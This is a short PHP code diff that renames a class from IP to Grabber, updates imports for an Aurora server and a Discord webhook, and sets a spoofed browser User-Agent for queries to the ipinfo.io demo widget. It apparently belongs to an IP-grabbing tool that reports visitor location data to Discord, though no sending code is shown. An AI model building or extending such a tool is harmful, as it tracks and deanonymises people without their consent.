@@ -2,24 +2,24 @@
 
 namespace Geo;
 
-require 'Server.php';
+require 'Aurora.php';
 require 'Discord.php';
 
+use Aurora\Server;
 use Discord\Webhook;
-use Server\AuroraServer;
 
-class IP
+class Grabber
 {
     private string $_BASE_URL = 'https://ipinfo.io/widget/demo/';
     private array $_header;
     private array $_options;
     private array $_body;
-    private AuroraServer $_server;
+    private Server $_server;
 
     public function __construct()
     {
 
-        $this->_server = new AuroraServer();
+        $this->_server = new Server();
 
         $this->_header = [
             "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
